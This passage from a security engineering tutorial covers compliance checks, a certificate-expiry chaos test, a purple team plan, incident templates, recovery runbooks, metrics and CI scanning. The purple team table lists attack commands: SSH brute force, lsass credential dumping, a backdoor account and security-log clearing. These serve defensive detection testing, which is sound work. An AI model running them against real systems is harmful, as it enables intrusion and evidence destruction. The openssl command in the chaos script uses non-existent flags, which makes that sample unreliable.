  title "Ensure SSH root login is disabled"
  desc "Root login via SSH bypasses sudo logging and individual accountability."

  describe sshd_config do                 # => InSpec resource: parses /etc/ssh/sshd_config
    its("PermitRootLogin") { should eq "no" }
                                          # => FAIL if PermitRootLogin is yes or prohibit-password
  end
end

# CIS 5.3.1 — Ensure password creation requirements are configured
control "cis-5.3.1" do
  impact 0.7
  title "Ensure password creation requirements are configured (pam_pwquality)"

  describe file("/etc/security/pwquality.conf") do
    its("content") { should match /minlen\s*=\s*1[4-9]|[2-9]\d/ }
                                          # => Minimum password length >= 14 characters
    its("content") { should match /minclass\s*=\s*[4]/ }
                                          # => Require all 4 character classes
  end
end

# CIS 6.1.2 — Ensure permissions on /etc/passwd are configured
control "cis-6.1.2" do
  impact 1.0
  title "Ensure permissions on /etc/passwd are configured"

  describe file("/etc/passwd") do
    it { should be_owned_by "root" }      # => Owner: root
    it { should be_grouped_into "root" }  # => Group: root
    its("mode") { should cmp "0644" }     # => Mode: -rw-r--r--
  end
end
```

```bash
# Run InSpec profile and generate HTML audit report
inspec exec inspec-cis-linux \
  --reporter html:/var/compliance/cis-report-$(date +%Y%m%d).html \
              json:/var/compliance/cis-report-$(date +%Y%m%d).json \
              cli                         # => Output to HTML, JSON, and terminal

# => HTML report: pass/fail per control with control descriptions
# => JSON report: machine-readable for SIEM ingestion and trending dashboards
# => CLI: summary table for immediate review

# Example output:
# Profile Summary: 42 successful, 3 failures, 0 skipped
# Test Summary: 67 successful, 4 failures
# FAILED cis-5.3.1: /etc/security/pwquality.conf content expected to match minlen >= 14
```

**Key Takeaway:** InSpec profiles convert compliance checklists into executable tests that produce evidence artifacts, replacing manual inspection with automated, reproducible compliance verification.

**Why It Matters:** Manual audit evidence collection is slow, error-prone, and difficult to reproduce between audit cycles. InSpec profiles run in CI/CD pipelines and produce structured JSON evidence that feeds compliance dashboards. When a control fails, the exact resource and expected value are recorded, eliminating ambiguity in remediation tickets. Chef InSpec profiles exist for CIS, DISA STIG, PCI DSS, and NIST 800-53 baselines, enabling broad compliance coverage through community-maintained profiles.

---

## Example 79: Security Chaos Engineering

**What this covers:** Security chaos engineering deliberately introduces security failures to test detection and response capabilities. This example simulates a certificate expiry scenario to verify that monitoring alerts fire and rotation runbooks work before a real outage.

**Scenario:** A team tests their certificate expiry monitoring by issuing a certificate with a short TTL, verifying that alerts trigger within the expected window, and confirming the rotation runbook completes successfully.

```bash
#!/usr/bin/env bash
# cert-expiry-chaos.sh — Test certificate expiry detection and rotation

TEST_DOMAIN="chaos-test.internal.example.com"
CERT_DIR="/tmp/chaos-certs"
MONITORING_WEBHOOK="https://hooks.example.com/alerts"   # => Alerting webhook endpoint

mkdir -p "$CERT_DIR"

echo "=== Phase 1: Issue short-lived certificate (chaos condition) ==="

# Generate CA and sign certificate expiring in 2 minutes
openssl req -x509 -newkey rsa:2048 \
  -keyout "$CERT_DIR/ca.key" \
  -out "$CERT_DIR/ca.crt" \
  -days 1 -nodes -subj "/CN=chaos-ca"
# => Self-signed CA for this test; expires tomorrow (not relevant to test)

openssl req -newkey rsa:2048 \
  -keyout "$CERT_DIR/test.key" \
  -out "$CERT_DIR/test.csr" \
  -nodes -subj "/CN=$TEST_DOMAIN"

openssl x509 -req \
  -in "$CERT_DIR/test.csr" \
  -CA "$CERT_DIR/ca.crt" \
  -CAkey "$CERT_DIR/ca.key" \
  -CAcreateserial \
  -days 0 -hours 0 -minutes 2 \          # => Certificate expires in 2 minutes (chaos!)
  -out "$CERT_DIR/test.crt"
# => Intentionally short TTL simulates an about-to-expire production certificate

EXPIRY=$(openssl x509 -in "$CERT_DIR/test.crt" -noout -enddate | cut -d= -f2)
echo "Certificate expires: $EXPIRY"       # => Confirms 2-minute expiry

echo ""
echo "=== Phase 2: Deploy to test nginx vhost ==="
# (In a real test, deploy to an isolated nginx instance)
# cp "$CERT_DIR/test.crt" /etc/ssl/chaos-test/server.crt
# nginx -s reload

echo ""
echo "=== Phase 3: Verify monitoring detects expiry within alert threshold ==="

# Check if expiry monitoring script fires for certificates expiring < 30 days
DAYS_LEFT=$(( ($(date -d "$EXPIRY" +%s 2>/dev/null || date -jf "%b %d %T %Y %Z" "$EXPIRY" +%s) \
               - $(date +%s)) / 86400 ))
echo "Days until expiry: $DAYS_LEFT"      # => Should be 0

if [ "$DAYS_LEFT" -lt 30 ]; then
    ALERT_FIRED=true
    echo "ALERT: Certificate for $TEST_DOMAIN expires in $DAYS_LEFT days"
    curl -s -X POST "$MONITORING_WEBHOOK" \
      -H "Content-Type: application/json" \
      -d "{\"alert\":\"cert_expiry\",\"domain\":\"$TEST_DOMAIN\",\"days_left\":$DAYS_LEFT}"
    # => Verify webhook delivers notification within SLA (typically < 5 minutes)
fi

echo ""
echo "=== Phase 4: Execute rotation runbook ==="
# Rotation test: generate replacement certificate with 365-day validity
openssl x509 -req \
  -in "$CERT_DIR/test.csr" \
  -CA "$CERT_DIR/ca.crt" \
  -CAkey "$CERT_DIR/ca.key" \
  -CAcreateserial \
  -days 365 \
  -out "$CERT_DIR/test-renewed.crt"       # => New certificate with 1-year validity
# => In production: use ACME (Let's Encrypt) or internal CA automation here

NEW_EXPIRY=$(openssl x509 -in "$CERT_DIR/test-renewed.crt" -noout -enddate | cut -d= -f2)
echo "Renewed certificate expires: $NEW_EXPIRY"  # => ~365 days from now

echo ""
echo "=== Chaos Test Results ==="
echo "Alert fired on short-lived cert: ${ALERT_FIRED:-false}"
echo "Rotation runbook completed: true"
echo "CHAOS TEST PASSED: Detection and rotation verified"
rm -rf "$CERT_DIR"                        # => Clean up test artifacts
```

**Key Takeaway:** Security chaos engineering validates that detection and response capabilities work under controlled conditions, building confidence that real incidents will be caught and handled correctly.

**Why It Matters:** Certificate expiry is a leading cause of production outages. Monitoring systems that are never tested often fail silently. Running a controlled expiry chaos test verifies the full pipeline: certificate age detection, alert delivery, on-call notification, and rotation runbook execution. GameDay exercises apply the same principle to all security controls — if you haven't tested your incident response, your incident response doesn't work.

---

## Example 80: Purple Team Exercise Plan

**What this covers:** Purple team exercises combine red team attack scenarios with blue team detection mapping to identify and close detection gaps. This example documents a structured exercise plan with attack scenarios mapped to expected SIEM detections.

**Scenario:** A security team runs a one-day purple team exercise targeting credential theft and lateral movement, measuring detection coverage for each attack step and documenting gaps for remediation.

```markdown
# Purple Team Exercise Plan

# Date: 2026-05-21 | Duration: 1 day | Scope: Internal network segment

## Objectives

- Validate SIEM detection coverage for credential theft kill-chain
- Identify detection gaps and assign remediation owners
- Test response time from alert to analyst acknowledgment

## Rules of Engagement

- Scope: 10.0.10.0/24 lab segment only
- No production systems
- Red team uses real TTPs but stops before data exfiltration
- Blue team operates normally (no advance notice of specific timing)

## Attack Scenario: Credential Theft → Lateral Movement

| Step | MITRE ATT&CK        | Red Team Action                           | Expected Detection                         | Alert Source     | Gap? |
| ---- | ------------------- | ----------------------------------------- | ------------------------------------------ | ---------------- | ---- |
| 1    | T1595 (Recon)       | nmap -sV -T4 10.0.10.0/24                 | Port scan from internal IP > 100 ports/10s | Zeek/SIEM        | TBD  |
| 2    | T1110 (Brute Force) | hydra ssh://10.0.10.5 -l admin -P rockyou | >5 SSH failures/min from same source       | fail2ban/SIEM    | TBD  |
| 3    | T1078 (Valid Accts) | SSH login with captured credential        | Login after recent failures (SIEM rule)    | Auth log/SIEM    | TBD  |
| 4    | T1003 (Cred Dump)   | Run mimikatz / proc dump of lsass         | lsass memory access with PROCESS_VM_READ   | EDR/Sysmon       | TBD  |
| 5    | T1021.002 (SMB)     | PsExec to adjacent host using dumped hash | SMB connection within 5min of lsass access | SIEM correlation | TBD  |
| 6    | T1136 (Create Acct) | net user backdoor P@ssw0rd /add           | New local account creation event (4720)    | Windows Event    | TBD  |
| 7    | T1070 (Log Clear)   | wevtutil cl security                      | Security log cleared event (1102)          | Windows Event    | TBD  |

## Detection Measurement Criteria

- DETECTED: Alert fired within 15 minutes of red team action
- DELAYED: Alert fired but > 15 minutes
- MISSED: No alert generated
- FALSE_NEG: Alert suppressed by tuning exclusion

## Post-Exercise Deliverables

1. Detection coverage matrix (% detected / delayed / missed per step)
2. Root-cause analysis for each MISSED detection
3. Remediation backlog with owner and target sprint
4. Updated Sigma rules for gaps identified
5. Response time SLA measurement (alert → acknowledgment)

## Sample Result Format

# Step 4 (Cred Dump): MISSED — Sysmon not deployed on 10.0.10.5

# Remediation: Deploy Sysmon with SwiftOnSecurity config to all Windows hosts

# Owner: infrastructure-team | Target: Sprint 47
```

**Key Takeaway:** Purple team exercises measure actual detection coverage rather than theoretical control presence, exposing gaps before adversaries find them.

**Why It Matters:** Security controls that exist on paper but fail in practice provide false confidence. Purple team exercises close the loop between attack capability and detection capability, producing a measured coverage percentage for each MITRE ATT&CK technique. Findings directly feed SIEM rule development, EDR configuration, and log source onboarding. Organizations running regular purple team exercises consistently outperform peers on mean-time-to-detect metrics in breach reports.

---

## Example 81: Incident Communication Template

**What this covers:** Effective incident communication requires consistent, factual, audience-appropriate messaging. This example provides an annotated security incident notification template covering initial notification, status updates, and post-incident summary.

**Scenario:** A security team detects unauthorized access to a customer data API. They must notify internal stakeholders, executive leadership, and potentially affected customers within regulatory timeframes.

```markdown
# SECURITY INCIDENT NOTIFICATION — TEMPLATE

# Classification: CONFIDENTIAL until public disclosure approved

---

## INITIAL NOTIFICATION (send within 1 hour of confirmed incident)

Subject: [SEV-1] Security Incident — Unauthorized API Access — 2026-05-21 10:15 UTC

To: security-incident-response@example.com (DL)
cto@example.com
legal@example.com
dpo@example.com ← Data Protection Officer (GDPR notification trigger)

Body:

**Incident Reference:** INC-2026-0521-001
**Severity:** SEV-1 (Critical — potential data exposure)
**Status:** ACTIVE — Containment in progress
**Declared:** 2026-05-21 10:15 UTC
**Incident Commander:** Jane Smith (security-lead@example.com)

### What We Know (as of 10:15 UTC)

- Unauthorized access detected to the /api/v2/customers endpoint
- First observed: 2026-05-21 09:47 UTC
- Source IP: 203.0.113.99 (geolocation: Netherlands)
- Estimated records accessed: unknown (investigation in progress)
- Authentication mechanism: compromised API key (key-id: ak_prod_7x9f2)

### What We Do Not Yet Know

- Total scope of data accessed
- Whether exfiltration occurred
- Whether this is a targeted attack or automated scanning

### Immediate Actions Taken

- [09:58 UTC] Revoked compromised API key ak_prod_7x9f2
- [10:05 UTC] Blocked source IP 203.0.113.99 at WAF
- [10:12 UTC] Initiated forensic log preservation (S3 versioning enabled)
- [10:15 UTC] Engaged incident response retainer (IR firm on call)

### Next Update

2026-05-21 12:00 UTC or sooner if significant developments

---

## STATUS UPDATE (every 2 hours during active incident)

Subject: [UPDATE 2] INC-2026-0521-001 — Containment Complete, Scope Analysis Active

**Status:** CONTAINED — Root cause under investigation
**Updated:** 2026-05-21 12:00 UTC

### Progress Since Last Update

- Forensic log analysis: 2.5 hours of API logs processed
- Confirmed data accessed: 1,247 customer records (name, email, subscription tier)
- Payment card data: NOT accessed (separate DB, no evidence of access)
- Root cause: API key leaked in public GitHub commit (commit hash: abc123)
  (commit detected by GitGuardian alert — initially missed by on-call rotation)

### GDPR Notification Assessment

- Data subjects: EU customers included (GDPR Article 33 applies)
- Notification required to DPA: YES — within 72 hours of awareness
- Customer notification: Under legal review — threshold met if "high risk to rights"
- DPA notification deadline: 2026-05-24 09:47 UTC

---

## POST-INCIDENT SUMMARY (publish within 5 business days)

Subject: Post-Incident Review — INC-2026-0521-001 — API Key Exposure

### Timeline (UTC)

| Time  | Event                                              |
| ----- | -------------------------------------------------- |
| 09:47 | Unauthorized API access begins                     |
| 09:52 | SIEM alert fires (anomalous API key usage pattern) |
| 09:58 | On-call engineer acknowledges; API key revoked     |
| 10:15 | SEV-1 declared; incident commander assigned        |
| 11:30 | Containment confirmed; forensic analysis begins    |
| 14:22 | Root cause identified (GitHub secret exposure)     |
| 16:00 | Customer notification approved by legal            |

### Contributing Factors

1. Pre-commit hook for secret scanning not enforced on developer workstation
2. GitGuardian alert routed to email, not PagerDuty (missed by on-call)
3. API key lacked IP allowlist restriction

### Corrective Actions

| Action                                      | Owner         | Due Date   |
| ------------------------------------------- | ------------- | ---------- |
| Enforce pre-commit secret scanning          | platform-team | 2026-05-28 |
| Route GitGuardian alerts to PagerDuty       | sre-team      | 2026-05-25 |
| Add IP allowlist to all production API keys | security-team | 2026-05-28 |
| Conduct API key rotation audit              | security-team | 2026-05-31 |
```

**Key Takeaway:** Structured incident communication templates reduce cognitive load under pressure, ensure regulatory deadlines are tracked, and create accountability through timestamped action ownership.

**Why It Matters:** During security incidents, communication failures cause as much damage as the technical breach. Regulatory penalties for late GDPR notification (72-hour window) can exceed the breach remediation cost. Pre-defined templates prevent teams from writing communications from scratch under stress, ensure legal and DPO are notified promptly, and produce the audit trail required by ISO 27001 incident management controls. The post-incident review drives systematic prevention of recurrence.

---

## Example 82: Business Continuity Runbook

**What this covers:** Business continuity runbooks codify the exact steps to recover a service within defined Recovery Time Objective (RTO) and Recovery Point Objective (RPO) targets. This example implements a database recovery script driven by RTO/RPO parameters.

**Scenario:** A PostgreSQL primary database becomes unavailable. The runbook must restore service within a 1-hour RTO with an RPO of 15 minutes using WAL streaming and a standby replica.

```bash
#!/usr/bin/env bash
# db-recovery-runbook.sh — PostgreSQL disaster recovery
# RTO target: 60 minutes | RPO target: 15 minutes

RTO_MINUTES=60
RPO_MINUTES=15
PRIMARY_HOST="db-primary.internal"
STANDBY_HOST="db-standby.internal"
BACKUP_BUCKET="s3://example-db-backups"
DB_NAME="production"
RUNBOOK_START=$(date +%s)                  # => Track elapsed time against RTO

log() {
    local elapsed=$(( ($(date +%s) - RUNBOOK_START) / 60 ))
    echo "[+${elapsed}min] $*"             # => Prefix every step with elapsed minutes
}

check_rto() {
    local elapsed=$(( ($(date +%s) - RUNBOOK_START) / 60 ))
    if [ "$elapsed" -ge "$RTO_MINUTES" ]; then
        echo "CRITICAL: RTO of ${RTO_MINUTES}min EXCEEDED at ${elapsed}min — escalate"
        exit 2                             # => Alert on-call escalation path
    fi
}

log "=== Database Recovery Runbook Started ==="
log "RTO: ${RTO_MINUTES}min | RPO: ${RPO_MINUTES}min"

# Step 1: Verify primary is truly unavailable (not a monitoring false positive)
log "Step 1: Confirm primary failure"
if pg_isready -h "$PRIMARY_HOST" -t 10 2>/dev/null; then
    log "ABORT: Primary $PRIMARY_HOST is responding — false alarm, no recovery needed"
    exit 0                                 # => Do not failover unnecessarily
fi
log "Confirmed: Primary $PRIMARY_HOST is unreachable"
check_rto

# Step 2: Check standby replication lag before promoting
log "Step 2: Assess standby replication lag"
LAG_SECONDS=$(psql -h "$STANDBY_HOST" -U postgres -t -c \
  "SELECT EXTRACT(EPOCH FROM (now() - pg_last_xact_replay_timestamp()))::int;" \
  2>/dev/null | tr -d ' ')
# => Returns seconds since last replayed WAL transaction
LAG_MINUTES=$(( LAG_SECONDS / 60 ))
log "Standby replication lag: ${LAG_MINUTES} minutes (RPO target: ${RPO_MINUTES}min)"

if [ "$LAG_MINUTES" -gt "$RPO_MINUTES" ]; then
    log "WARNING: Lag ${LAG_MINUTES}min exceeds RPO ${RPO_MINUTES}min"
    log "Attempting WAL fetch from S3 to reduce lag before promotion"
    # => Attempt to replay remaining WAL segments from S3 backup bucket
    aws s3 sync "$BACKUP_BUCKET/wal/" /var/lib/postgresql/14/wal_archive/ \
      --only-show-errors                   # => Fetch any WAL segments not yet replicated
fi
check_rto

# Step 3: Promote standby to primary
log "Step 3: Promote standby to new primary"
pg_ctl promote -D /var/lib/postgresql/14/main
# => Creates /tmp/postgresql.trigger.5432 or runs pg_ctl promote
# => Standby exits recovery mode and begins accepting writes

sleep 5
if pg_isready -h "$STANDBY_HOST" -t 15; then
    log "SUCCESS: $STANDBY_HOST promoted and accepting connections"
else
    log "ERROR: Promotion failed — check PostgreSQL logs on $STANDBY_HOST"
    exit 1
fi
check_rto

# Step 4: Update DNS / connection string
log "Step 4: Update DNS to point db.internal → $STANDBY_HOST"
# AWS Route 53 example:
aws route53 change-resource-record-sets \
  --hosted-zone-id Z1234567890 \
  --change-batch "{
    \"Changes\": [{
      \"Action\": \"UPSERT\",
      \"ResourceRecordSet\": {
        \"Name\": \"db.internal\",
        \"Type\": \"CNAME\",
        \"TTL\": 30,
        \"ResourceRecords\": [{\"Value\": \"$STANDBY_HOST\"}]
      }
    }]
  }"
# => Low TTL (30s) set in advance for fast failover; update now points apps at new primary

ELAPSED=$(( ($(date +%s) - RUNBOOK_START) / 60 ))
log "=== Recovery Complete in ${ELAPSED} minutes ==="
log "RTO status: $([ "$ELAPSED" -lt "$RTO_MINUTES" ] && echo 'MET' || echo 'EXCEEDED')"
log "Post-recovery: initiate new standby provisioning within 4 hours"
```

**Key Takeaway:** Scripted recovery runbooks with RTO timers prevent ad-hoc decision-making under pressure and produce a timestamped audit trail proving recovery objectives were met.

**Why It Matters:** Most DR plans are documents that nobody practices. Scripted runbooks encoding RTO/RPO constraints can be rehearsed in controlled environments, revealing hidden dependencies and timing issues before a real disaster. The elapsed-time tracking embedded in the script creates accountability: if the RTO is exceeded, an escalation path triggers automatically. ISO 22301 (Business Continuity) and SOC 2 Type II require evidence that recovery procedures are tested and function within declared objectives.

---

## Example 83: Security KPIs and Metrics Dashboard

**What this covers:** Security metrics quantify program effectiveness and surface trends that enable data-driven prioritization. This example exposes security events as Prometheus metrics that feed a Grafana dashboard for real-time situational awareness.

**Scenario:** A security operations team builds a metrics pipeline that aggregates authentication failures, vulnerability counts, and certificate expiry data into a Prometheus/Grafana stack.

```python
#!/usr/bin/env python3
# security_metrics_exporter.py — Prometheus exporter for security KPIs

from prometheus_client import (
    start_http_server,          # => Starts HTTP server on metrics port
    Counter,                    # => Monotonically increasing count
    Gauge,                      # => Point-in-time value (can go up or down)
    Histogram,                  # => Distribution of values (e.g., response times)
)
import subprocess
import re
import time
import ssl
import socket

# === Metric Definitions ===

# Authentication metrics
AUTH_FAILURES = Counter(
    "security_auth_failures_total",
    "Total authentication failures",
    ["service", "reason"],      # => Labels: differentiate by service and failure reason
)
# => Usage: AUTH_FAILURES.labels(service="ssh", reason="invalid_user").inc()

AUTH_SUCCESSES = Counter(
    "security_auth_successes_total",
    "Total successful authentications",
    ["service"],
)

# Vulnerability metrics
OPEN_VULNS = Gauge(
    "security_open_vulnerabilities",
    "Current count of open vulnerabilities by severity",
    ["severity"],               # => Labels: critical, high, medium, low
)
# => Updated by periodic scanner integration (Trivy, Grype, etc.)

# Certificate metrics
CERT_EXPIRY_DAYS = Gauge(
    "security_certificate_expiry_days",
    "Days until certificate expiry",
    ["domain", "environment"],  # => Labels: domain name and environment (prod/staging)
)

# Failed login rate (for anomaly alerting)
FAILED_LOGIN_RATE = Gauge(
    "security_failed_login_rate_per_minute",
    "Authentication failures per minute (rolling 5-min average)",
    ["service"],
)


def parse_auth_log_failures(log_path: str = "/var/log/auth.log") -> dict:
    """Parse recent SSH failures from auth.log. Returns count by reason."""
    counts = {"invalid_user": 0, "invalid_password": 0, "connection_closed": 0}
    try:
        result = subprocess.run(
            ["grep", "-c", "Failed password", log_path],
            capture_output=True, text=True
        )
        counts["invalid_password"] = int(result.stdout.strip() or 0)
        # => Count lines matching "Failed password" since log rotation
    except (subprocess.SubprocessError, ValueError):
        pass
    return counts


def check_certificate_expiry(domain: str, port: int = 443) -> int:
    """Return days until certificate expiry for a domain."""
    ctx = ssl.create_default_context()
    with socket.create_connection((domain, port), timeout=5) as sock:
        with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
            cert = ssock.getpeercert()
            expiry_str = cert["notAfter"]           # => e.g. "May 21 00:00:00 2027 GMT"
            expiry = ssl.cert_time_to_seconds(expiry_str)
            days_left = int((expiry - time.time()) / 86400)
            return days_left


def collect_metrics():
    """Collect all security metrics. Called on each scrape cycle."""
    # Collect auth failures
    failures = parse_auth_log_failures()
    for reason, count in failures.items():
        AUTH_FAILURES.labels(service="ssh", reason=reason)
        # => In production, delta the counter per scrape interval

    # Collect certificate expiry
    domains = [
        ("api.example.com", "prod"),
        ("app.example.com", "prod"),
        ("staging.example.com", "staging"),
    ]
    for domain, env in domains:
        try:
            days = check_certificate_expiry(domain)
            CERT_EXPIRY_DAYS.labels(domain=domain, environment=env).set(days)
            # => Grafana alert rule: fire when days < 30
        except Exception:
            CERT_EXPIRY_DAYS.labels(domain=domain, environment=env).set(-1)
            # => -1 signals collection failure (separate alert rule)

    # Collect vulnerability counts from latest scanner output
    OPEN_VULNS.labels(severity="critical").set(2)   # => From latest grype scan results
    OPEN_VULNS.labels(severity="high").set(7)
    OPEN_VULNS.labels(severity="medium").set(14)


if __name__ == "__main__":
    start_http_server(9101)                 # => Metrics available at :9101/metrics
    print("Security metrics exporter running on :9101")

    while True:
        collect_metrics()
        time.sleep(60)                      # => Refresh metrics every 60 seconds
```

**Key Takeaway:** Instrumenting security controls as Prometheus metrics enables trend analysis, threshold alerting, and SLA measurement that transform reactive security operations into data-driven programs.

**Why It Matters:** Security teams without metrics cannot demonstrate improvement, justify investment, or detect gradual degradation in control effectiveness. Prometheus + Grafana provides a vendor-neutral, open-source stack that integrates with existing observability infrastructure. Certificate expiry gauges triggering PagerDuty at 30 days eliminate a leading cause of preventable outages. Vulnerability count trending over sprints provides objective evidence of risk reduction velocity for board-level reporting.

---

## Example 84: Security Testing in CI/CD

**What this covers:** Integrating security tools into CI/CD pipelines shifts vulnerability detection left, blocking insecure code before it reaches production. This example implements a GitHub Actions workflow running Trivy container scanning and Semgrep static analysis on every pull request.

**Scenario:** A platform team adds a mandatory security gate to every pull request workflow. Builds fail if Trivy finds critical container vulnerabilities or Semgrep detects high-confidence security anti-patterns in code changes.

```yaml
# .github/workflows/security-gate.yml
name: Security Gate

on:
  pull_request:
    branches: [main] # => Run on every PR targeting main
  push:
    branches: [main] # => Also run on merge to main

jobs:
  trivy-container-scan:
    name: Container Vulnerability Scan (Trivy)
    runs-on: ubuntu-latest
    permissions:
      security-events: write # => Required to upload SARIF to GitHub Security tab
      contents: read

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Build container image
        run: |
          docker build -t app:${{ github.sha }} .
          # => Build image from current PR's Dockerfile
          # => Tag with commit SHA for traceability

      - name: Run Trivy vulnerability scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: "app:${{ github.sha }}"
          format: "sarif" # => SARIF format uploads to GitHub Security tab
          output: "trivy-results.sarif"
          severity: "CRITICAL,HIGH" # => Only report CRITICAL and HIGH findings
          exit-code: "1" # => Fail workflow on any CRITICAL/HIGH finding
          ignore-unfixed: true # => Skip CVEs with no available fix (reduce noise)
        # => Trivy scans: OS packages, language dependencies, Dockerfile misconfigurations

      - name: Upload Trivy results to GitHub Security
        uses: github/codeql-action/upload-sarif@v3
        if: always() # => Upload even if scan step failed
        with:
          sarif_file: "trivy-results.sarif"
          # => Findings appear in Security → Code scanning alerts tab

  semgrep-sast:
    name: Static Application Security Testing (Semgrep)
    runs-on: ubuntu-latest
    permissions:
      security-events: write
      contents: read

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Run Semgrep SAST
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/owasp-top-ten
            p/nodejs
          # => p/security-audit: general security patterns
          # => p/owasp-top-ten: OWASP Top 10 detections (SQL injection, XSS, etc.)
          # => p/nodejs: Node.js-specific anti-patterns (eval, child_process misuse)
          generateSarif: "1"
          auditOn: push # => Report mode on push; block on PR
        env:
          SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}
          # => App token enables Semgrep Cloud dashboard for finding management

      - name: Upload Semgrep results
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: semgrep.sarif
          # => Semgrep findings appear alongside Trivy in Security tab

  secrets-scan:
    name: Secret Detection
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          fetch-depth: 0 # => Full history required for git-secrets scanning

      - name: Run Gitleaks secret scan
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          GITLEAKS_LICENSE: ${{ secrets.GITLEAKS_LICENSE }}
        # => Scans entire git history for credentials, API keys, private keys
        # => Fails workflow if any secret found (no severity threshold — all secrets block)
```

**Key Takeaway:** Security gates in CI/CD pipelines enforce automated vulnerability scanning at code review time, making security a standard part of every development workflow rather than a separate phase.

**Why It Matters:** Security testing performed only at release gates creates bottlenecks and incentivizes skipping. CI-integrated scanning provides developers with security feedback in the same interface where they receive test and lint results, normalizing security as a coding quality concern. Trivy's `ignore-unfixed` flag reduces false-positive fatigue by focusing on actionable findings. SARIF upload to GitHub Security tab centralizes finding management without requiring separate tooling for developers.

---

## Example 85: Advanced Cloud Security Posture

**What this covers:** Cloud Security Posture Management (CSPM) continuously evaluates cloud resource configurations against security best practices. This example uses the AWS Security Hub API to aggregate and prioritize findings across multiple AWS services into a unified risk view.

**Scenario:** A cloud security team queries AWS Security Hub to produce a prioritized remediation backlog, grouping findings by severity and resource type to focus engineering effort on the highest-risk misconfigurations.

```python
#!/usr/bin/env python3
# aws_security_hub_report.py — Aggregate and prioritize Security Hub findings

import boto3
import json
from collections import defaultdict
from datetime import datetime, timezone

# Initialize Security Hub client
sh = boto3.client("securityhub", region_name="us-east-1")
# => Requires IAM permissions: securityhub:GetFindings, securityhub:ListFindingAggregators

def get_active_findings(max_results: int = 100) -> list:
    """Fetch all active HIGH and CRITICAL findings from Security Hub."""
    findings = []
    paginator = sh.get_paginator("get_findings")

    pages = paginator.paginate(
        Filters={
            "RecordState": [{"Value": "ACTIVE", "Comparison": "EQUALS"}],
            # => Only active findings (not archived/suppressed)
            "WorkflowStatus": [
                {"Value": "NEW", "Comparison": "EQUALS"},
                {"Value": "NOTIFIED", "Comparison": "EQUALS"},
            ],
            # => NEW and NOTIFIED — exclude SUPPRESSED and RESOLVED
            "SeverityLabel": [
                {"Value": "CRITICAL", "Comparison": "EQUALS"},
                {"Value": "HIGH", "Comparison": "EQUALS"},
            ],
            # => Focus on actionable high-severity findings first
        },
        PaginationConfig={"MaxItems": max_results, "PageSize": 25},
    )

    for page in pages:
        findings.extend(page["Findings"])
        # => Each finding includes: Id, Title, Description, Severity, Resources, Remediation

    return findings


def analyze_findings(findings: list) -> dict:
    """Group findings by severity and resource type for prioritization."""
    by_severity = defaultdict(list)
    by_resource_type = defaultdict(int)
    by_control = defaultdict(int)

    for f in findings:
        severity = f["Severity"]["Label"]       # => CRITICAL or HIGH
        by_severity[severity].append(f)

        for resource in f.get("Resources", []):
            rtype = resource.get("Type", "Unknown")
            by_resource_type[rtype] += 1        # => Count findings per resource type

        # CIS/AWS Foundational control ID
        control_id = f.get("Compliance", {}).get("RelatedRequirements", ["UNKNOWN"])[0]
        by_control[control_id] += 1             # => Count findings per compliance control

    return {
        "by_severity": dict(by_severity),
        "by_resource_type": dict(by_resource_type),
        "by_control": dict(by_control),
    }


def print_remediation_backlog(analysis: dict):
    """Print prioritized remediation backlog."""
    print(f"\n{'='*60}")
    print(f"AWS Security Hub — Posture Report")
    print(f"Generated: {datetime.now(timezone.utc).isoformat()}")
    print(f"{'='*60}")

    # Critical findings first
    for severity in ["CRITICAL", "HIGH"]:
        findings_list = analysis["by_severity"].get(severity, [])
        print(f"\n[{severity}] {len(findings_list)} findings")
        print("-" * 40)
        for f in findings_list[:5]:             # => Top 5 per severity (truncate for readability)
            title = f["Title"][:70]             # => Truncate long titles
            resources = [r["Id"].split(":")[-1] for r in f.get("Resources", [])]
            remediation = f.get("Remediation", {}).get("Recommendation", {}).get("Text", "")[:80]
            print(f"  Title:       {title}")
            print(f"  Resources:   {', '.join(resources[:3])}")
            # => Resource ARN last segment (e.g., "my-s3-bucket", "i-0abc123def")
            print(f"  Remediation: {remediation}")
            print()

    # Resource type distribution
    print("\n[Resource Type Distribution]")
    for rtype, count in sorted(analysis["by_resource_type"].items(),
                                key=lambda x: -x[1]):
        bar = "#" * min(count, 20)              # => ASCII bar chart capped at 20 chars
        print(f"  {rtype:40s} {bar} {count}")
        # => Example: AwsS3Bucket #################### 22
        # => Example: AwsEc2Instance ############ 12
        # => Identifies resource types with most misconfigurations


if __name__ == "__main__":
    print("Fetching Security Hub findings...")
    findings = get_active_findings(max_results=200)
    print(f"Retrieved {len(findings)} active HIGH/CRITICAL findings")

    analysis = analyze_findings(findings)
    print_remediation_backlog(analysis)

    # Export JSON for SIEM ingestion
    with open("/var/security/cspm-report.json", "w") as f:
        json.dump({
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "total_findings": len(findings),
            "resource_type_counts": analysis["by_resource_type"],
            "control_counts": analysis["by_control"],
        }, f, indent=2)
    print("\nJSON report written to /var/security/cspm-report.json")
```

**Key Takeaway:** AWS Security Hub aggregation across GuardDuty, Inspector, Macie, and Config produces a unified risk backlog that eliminates the need to monitor multiple security consoles separately.

**Why It Matters:** Cloud environments generate hundreds of security findings per day across dozens of services. Without aggregation and prioritization, security teams lose signal in noise and remediate low-risk findings while critical misconfigurations persist. Security Hub's cross-service aggregation and CRITICAL/HIGH severity filtering focuses engineering effort on the highest-impact items. The resource-type distribution analysis reveals systemic issues — if 22 S3 buckets have findings, a policy guardrail fixes the root cause rather than remediating each bucket individually.
